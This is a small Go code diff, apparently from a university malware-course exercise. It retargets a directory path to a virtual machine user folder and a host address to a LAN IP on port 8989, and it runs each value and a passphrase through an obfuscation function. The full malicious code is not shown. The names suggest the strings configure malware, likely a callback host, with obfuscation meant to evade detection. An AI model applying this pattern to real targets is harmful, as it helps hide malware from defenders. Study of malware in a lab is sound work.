@@ -18,7 +18,7 @@ func ofuscarTexto(texto string) string {
 
 func main() {
 
-	dir := "/Users/dani/Unileon/fundamentos/malware/prueba"
+	dir := "C:/Users/vboxuser"
 	dir = ofuscarTexto(dir)
 	fmt.Printf("ofuscado dir: %s\n", dir)
 	passkey := "comoMolo"
@@ -46,7 +46,7 @@ func main() {
 	passphrase := "comoMolo"
 	passphrase = ofuscarTexto(passphrase)
 	fmt.Printf("ofuscado passphrase: %s\n", passphrase)
-	host := "127.0.0.1:8989"
+	host := "192.168.1.154:8989"
 	host = ofuscarTexto(host)
 	fmt.Printf("ofuscado host: %s\n", host)
 
